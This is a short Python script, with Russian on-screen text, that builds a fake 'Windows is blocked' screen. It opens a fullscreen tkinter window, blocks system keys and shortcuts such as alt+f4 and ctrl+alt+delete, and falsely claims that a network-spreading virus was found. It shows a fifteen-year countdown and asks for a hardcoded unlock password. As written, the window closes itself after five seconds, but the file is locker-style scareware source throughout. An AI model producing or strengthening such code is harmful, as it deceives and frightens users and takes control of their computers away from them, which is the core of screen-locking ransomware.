import tkinter as tk
import time
import os
import keyboard

def block_keys():
    # Блокируем основные сочетания клавиш
    keyboard.block_key('alt')
    keyboard.block_key('ctrl')
    keyboard.block_key('shift')
    keyboard.block_key('win')
    keyboard.block_key('tab')
    keyboard.block_key('esc')
    keyboard.block_key('f4')
    keyboard.block_key('alt+f4')
    keyboard.block_key('ctrl+alt+delete')
    keyboard.block_key('ctrl+shift+esc')
    keyboard.block_key('win+r')

def unlock():
    if entry.get().lower() == "mrrussk":
        root.destroy()
    else:
        error_label.config(text="Неверный пароль!")

root = tk.Tk()
root.attributes('-fullscreen', True)
root.config(bg='black')
root.title("Windows Заблокирован!")

# Блокируем клавиши
block_keys()

# Основное сообщение
label1 = tk.Label(root, text="Windows Заблокирован!", fg='red', bg='black', font=('Arial', 40))
label1.pack(pady=50)

label2 = tk.Label(root, text="Твой компьютер заблокирован!\nПричина: На вашем ПК был обнаружен вирус,\nкоторый распространяется по локальной сети,\nдля безопасности мы принимаем решение его заблокировать!", 
                 fg='white', bg='black', font=('Arial', 24))
label2.pack(pady=30)

label3 = tk.Label(root, text="До разблокировки компьютера: 14 лет 12 месяцев", 
                 fg='white', bg='black', font=('Arial', 24))
label3.pack(pady=20)

# Поле для ввода пароля
tk.Label(root, text="Введите пароль для досрочной разблокировки:", 
        fg='white', bg='black', font=('Arial', 16)).pack(pady=20)
entry = tk.Entry(root, font=('Arial', 16), show="*")
entry.pack()

error_label = tk.Label(root, text="", fg='red', bg='black', font=('Arial', 14))
error_label.pack()

tk.Button(root, text="Разблокировать", command=unlock, font=('Arial', 14)).pack(pady=20)

# Закрытие через 5 секунд
root.after(5000, root.destroy)

root.mainloop()